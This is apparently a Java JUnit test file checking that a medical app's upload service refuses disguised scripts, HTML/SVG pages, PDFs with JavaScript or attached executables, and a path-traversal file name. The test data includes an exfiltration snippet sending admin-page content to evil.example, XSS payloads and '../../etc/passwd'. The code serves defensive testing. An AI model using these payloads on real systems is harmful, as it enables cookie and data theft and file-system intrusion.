package com.medizon.service;

import org.apache.pdfbox.pdmodel.PDDocument;
import org.apache.pdfbox.pdmodel.PDDocumentNameDictionary;
import org.apache.pdfbox.pdmodel.PDEmbeddedFilesNameTreeNode;
import org.apache.pdfbox.pdmodel.PDPage;
import org.apache.pdfbox.pdmodel.common.filespecification.PDComplexFileSpecification;
import org.apache.pdfbox.pdmodel.common.filespecification.PDEmbeddedFile;
import org.apache.pdfbox.pdmodel.interactive.action.PDActionJavaScript;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.springframework.mock.web.MockMultipartFile;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/** Uploads are judged by their bytes: a script, page or booby-trapped PDF never gets stored. */
class UploadSafetyTest {

    private static final byte[] PNG = {(byte) 0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 0x0D, 'I', 'H', 'D', 'R'};
    private static final byte[] JPEG = {(byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0, 0x10, 'J', 'F', 'I', 'F'};

    @TempDir Path dir;

    private FileStorageService storage() throws Exception { return new FileStorageService(dir.toString()); }

    private static MockMultipartFile file(String name, String type, byte[] bytes) {
        return new MockMultipartFile("file", name, type, bytes);
    }

    @Test
    void aScriptDisguisedAsAPhotoIsRefused() throws Exception {
        byte[] js = "fetch('/admin').then(r => r.text()).then(t => new Image().src='//evil.example/?'+t)".getBytes(StandardCharsets.UTF_8);
        FileStorageService s = storage();
        // Whatever name and type the uploader claims
        assertThatThrownBy(() -> s.storeSupportImage(file("photo.png", "image/png", js))).isInstanceOf(BusinessException.class);
        assertThatThrownBy(() -> s.store(file("script.js", "application/javascript", js))).isInstanceOf(BusinessException.class);
        assertThatThrownBy(() -> s.store(file("rx.pdf", "application/pdf", js))).isInstanceOf(BusinessException.class);
        assertThatThrownBy(() -> s.storeMedicineImage(file("x.jpg", "image/jpeg", js))).isInstanceOf(BusinessException.class);
        try (var files = Files.walk(dir)) {
            assertThat(files.filter(Files::isRegularFile)).as("nothing written").isEmpty();
        }
    }

    @Test
    void htmlAndSvgPagesAreRefused() throws Exception {
        FileStorageService s = storage();
        byte[] html = "<html><script>alert(document.cookie)</script></html>".getBytes(StandardCharsets.UTF_8);
        byte[] svg = "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>".getBytes(StandardCharsets.UTF_8);
        assertThatThrownBy(() -> s.storeReturnImage(file("a.png", "image/png", html))).isInstanceOf(BusinessException.class);
        assertThatThrownBy(() -> s.storeReturnImage(file("a.svg", "image/png", svg))).isInstanceOf(BusinessException.class);
    }

    @Test
    void realPhotosAreKeptUnderARandomNameWithTheirRealType() throws Exception {
        FileStorageService s = storage();
        // A JPEG the browser called a PNG, under a name trying to climb out of the folder
        MockMultipartFile photo = file("../../etc/passwd.png", "image/png", JPEG);
        String name = s.storeSupportImage(photo);
        assertThat(name).startsWith("support/").endsWith(".jpg").doesNotContain("..").doesNotContain("passwd");
        assertThat(s.typeOf(photo)).isEqualTo("image/jpeg");
        assertThat(Files.readAllBytes(dir.resolve(name))).isEqualTo(JPEG);
        assertThat(s.storeMedicineImage(file("p.png", "image/png", PNG))).startsWith(FileStorageService.MEDICINE_IMAGE_PATH).endsWith(".png");
    }

    @Test
    void aPlainPdfIsKept() throws Exception {
        assertThat(storage().store(file("rx.pdf", "application/pdf", pdf(null)))).endsWith(".pdf");
    }

    @Test
    void aPdfWithJavaScriptIsRefused() throws Exception {
        byte[] bad = pdf(doc -> doc.getDocumentCatalog().setOpenAction(new PDActionJavaScript("app.alert('pwned')")));
        assertThatThrownBy(() -> storage().store(file("rx.pdf", "application/pdf", bad))).hasMessageContaining("JavaScript");
    }

    @Test
    void aPdfHidingAnAttachedFileIsRefused() throws Exception {
        byte[] bad = pdf(doc -> {
            PDComplexFileSpecification spec = new PDComplexFileSpecification();
            spec.setFile("payload.exe");
            spec.setEmbeddedFile(new PDEmbeddedFile(doc, new ByteArrayInputStream(new byte[]{'M', 'Z'})));
            PDEmbeddedFilesNameTreeNode tree = new PDEmbeddedFilesNameTreeNode();
            tree.setNames(Map.of("payload.exe", spec));
            PDDocumentNameDictionary names = new PDDocumentNameDictionary(doc.getDocumentCatalog());
            names.setEmbeddedFiles(tree);
            doc.getDocumentCatalog().setNames(names);
        });
        assertThatThrownBy(() -> storage().store(file("rx.pdf", "application/pdf", bad))).hasMessageContaining("attached files");
    }

    @Test
    void signaturesAreReadFromTheBytes() {
        assertThat(UploadInspector.detect(PNG)).isEqualTo("image/png");
        assertThat(UploadInspector.detect(JPEG)).isEqualTo("image/jpeg");
        assertThat(UploadInspector.detect("GIF89a....".getBytes(StandardCharsets.US_ASCII))).isEqualTo("image/gif");
        assertThat(UploadInspector.detect("RIFF\0\0\0\0WEBPVP8 ".getBytes(StandardCharsets.US_ASCII))).isEqualTo("image/webp");
        assertThat(UploadInspector.detect("MZ\u0090\0".getBytes(StandardCharsets.ISO_8859_1))).isNull();   // a Windows program
        assertThat(UploadInspector.detect("PK\u0003\u0004".getBytes(StandardCharsets.ISO_8859_1))).isNull();   // a zip
    }

    private interface Change { void apply(PDDocument doc) throws Exception; }

    private static byte[] pdf(Change change) throws Exception {
        try (PDDocument doc = new PDDocument(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            doc.addPage(new PDPage());
            if (change != null) change.apply(doc);
            doc.save(out);
            return out.toByteArray();
        }
    }
}
